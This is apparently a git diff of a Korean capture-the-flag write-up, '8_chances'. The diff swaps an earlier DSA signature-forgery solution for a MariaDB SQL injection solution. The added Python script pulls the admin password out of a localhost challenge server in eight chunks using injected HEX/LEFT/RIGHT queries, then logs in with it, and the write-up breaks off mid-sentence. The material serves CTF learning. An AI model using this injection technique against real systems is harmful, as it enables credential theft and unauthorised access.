@@ -1,11 +1,11 @@
 # 8_chances
 
-# Concept
+## Concept
 
 - sql injection
 - mariadb
 
-# Writeup
+## Writeup
 
 주요 기능을 정리해보겠습니다.
 1. `reset` : `chance`를 8로 초기화합니다.
@@ -16,53 +16,71 @@
    `string.punctuation + string.whitespace + string.digits`
    을 포함하면 안 됩니다.
 
-실제 DSA와 몇 가지 차이점이 존재합니다
 
-1. `h = hash(m)`의 과정을 거치지 않고, 바로 `m` 자체가 `h`의 역할을 수행합니다.
-2. sign, verify 과정에서 `r`을 계산할 때 `p`로 나눈 나머지를 계산한 후 `q`에 대한 나머지를 계산하지 않습니다.
+## ex.py
 
-목표는 특정 `h0`에 대한 서명이 알려져 있을 때, 다른 `h`에 대한 서명을 생성하는 것입니다. 입력받는 `h`에 범위 제한이 있어, `h0`에 `q`를 더하고 빼는 방법으로는 해결할 수 없습니다.
-
-$g^{\frac{h_0 + xr_0}{s_0}} \equiv r_0 \pmod p$ 이라는 식으로부터 시작하겠습니다.
-
-양변에 $g$를 곱해주면 다음과 같습니다. 몇 번 곱해주든 상관없지만, 1회 곱하겠습니다.
-
-$$g^{\frac{h_0 + xr_0}{s_0} + 1} \equiv gr_0 \pmod p$$
-
-새로 사용할 $r = gr_0 \mod p$로 정의하겠습니다. $p$로 나눈 나머지를 설정하지 않으면 $g$의 pow 연산 후의 결과가 $p$보다 클 수 없기 때문에 검증에 실패합니다.
-
-이제 좌변의 지수를 식의 꼴에 맞게 변형해주겠습니다.
-
-$$\frac{h_0 + xr_0}{s_0} + 1 \equiv \frac{h_0 + s_0 + xr_0}{s_0} \equiv \frac{r(h_0 + s_0)/r_0 + xr}{rs_0/r_0} \pmod q$$
-
-새로 생성한 $r$은 $q$를 법으로 기존과 전혀 다른 수이기 때문에 이렇게 수동으로 값을 나누어주어야 합니다.
-
-$$h = r(h_0 + s_0)/r_0, s = rs_0/r_0$$
-이와 같이 새 $r, h, s$를 정의하면 해결할 수 있습니다.
-
-
-#### ex.py
 ```python
-from pwn import *
+import requests
 
-io = process(["python3", "chall.py"])
+base_url = "http://localhost:10000/"
 
-def recv():
-    io.recvuntil(b" = ")
-    return int(io.recvline())
+def reset():
+    data = {
+        "user" : "1",
+        "pass" : "1",
+        "testquery" : "1",
+        "type" : "reset"
+    }
+    requests.post(base_url, data=data)
 
-h, p, q, g, y, r, s = [recv() for _ in range(7)]
+def test(testquery : str):
+    data = {
+        "user" : "1",
+        "pass" : "1",
+        "testquery" : testquery,
+        "type" : "test"
+    }
+    res = requests.post(base_url, data=data)
+    msg = res.text
+    msg = msg.split('\n')[110].split('<')[1].split('>')[1]
+    return msg
 
-r_ = (g * r) % p
-h_ = ((s + h) * r_ * pow(r, -1, q)) % q
-s_ = (s * r_ * pow(r, -1, q)) % q
+def real(ps : str):
+    data = {
+        "user" : "admin",
+        "pass" : ps,
+        "testquery" : "1",
+        "type" : "real"
+    }
+    res = requests.post(base_url, data=data)
+    return res.text
 
-io.sendlineafter(b"h = ", str(h_).encode())
-io.sendlineafter(b"r = ", str(r_).encode())
-io.sendlineafter(b"s = ", str(s_).encode())
+def lef(s : str, n : int):
+    return "LEFT(" + s + f", {str(n)})"
 
-io.interactive()
+def rig(s : str, n : int):
+    return "RIGHT(" + s + f", {str(n)})"
 
+def outline(s : str):
+    return "SELECT CAST(" + s + " as UNSIGNED)"
+
+base_payload = f"""
+HEX(HEX((SELECT password FROM users WHERE username='admin')))
+""".strip()
+
+reset()
+pw = ""
+pw += test(outline(lef(lef(lef(base_payload, 76), 38), 19)))
+pw += test(outline(rig(lef(lef(base_payload, 76), 38), 19)))
+pw += test(outline(lef(rig(lef(base_payload, 76), 38), 19)))
+pw += test(outline(rig(rig(lef(base_payload, 76), 38), 19)))
+pw += test(outline(lef(lef(rig(base_payload, 76), 38), 19)))
+pw += test(outline(rig(lef(rig(base_payload, 76), 38), 19)))
+pw += test(outline(lef(rig(rig(base_payload, 76), 38), 19)))
+pw += test(outline(rig(rig(rig(base_payload, 76), 38), 19)))
+realpw = bytes.fromhex(bytes.fromhex(pw).decode()).decode()
+print(realpw)
+print(real(realpw))
 ```
 
-다른 여러 h값에 대한 서명도 생성 가능합니다.
+8등분하느 
